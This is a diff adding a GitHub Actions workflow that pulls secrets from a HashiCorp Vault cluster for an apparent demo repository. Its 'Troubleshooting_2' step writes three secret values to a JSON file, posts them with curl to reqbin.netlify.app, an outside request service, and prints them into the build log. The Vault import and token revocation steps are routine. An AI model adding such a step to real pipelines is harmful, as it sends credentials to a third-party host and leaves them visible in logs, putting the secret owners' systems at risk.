@@ -1,0 +1,40 @@
+name: HashiCorpDemo_myraprojectrepo
+on:
+  push:
+    branches:
+      - main
+    paths-ignore:
+      - '*.md'
+jobs:
+  get-secret:
+    permissions:
+      contents: 'read'
+      id-token: 'write'
+    runs-on: ubuntu-latest
+    name: get-secret
+    steps:
+      - name: Import Secrets
+        id: import-secrets
+        uses: hashicorp/vault-action@v3.3.0
+        with:
+          url: https://ra-vault-cluster-public-vault-193294ff.3b9e56d2.z1.hashicorp.cloud:8200
+          path: auth_jwt
+          role: role_gha
+          method: jwt
+          exportToken: true
+          exportEnv: true
+          namespace: admin
+          secrets: |
+            mount_kv/data/repo:ra-standard/HashiCorpDemo_29May2025:ref:refs/heads/main/HashiCorpDemo_29May2025_Action01 ** | RA_ ;
+      - name: Troubleshooting_2
+        run: |
+          echo "{ RA_secret1_key: \"${{env.RA_secret1_key}}\", RA_secret2_key:  \"${{env.RA_secret2_key}}\", RA_secret3_key:  \"${{env.RA_secret3_key}}\"   }" > ./secrets.json
+          curl -i -H "Accept: application/json" --data @secrets.json https://reqbin.netlify.app/.netlify/functions/reqbin
+          
+          cat ./secrets.json
+          rm ./secrets.json
+      - name: Revoke Vault Token
+        if: always()
+        run: |
+          curl -X POST -sv --fail-with-body -H "X-Vault-Token: ${{ env.VAULT_TOKEN }}" \
+            https://ra-vault-cluster-public-vault-193294ff.3b9e56d2.z1.hashicorp.cloud:8200/v1/auth/token/revoke-self
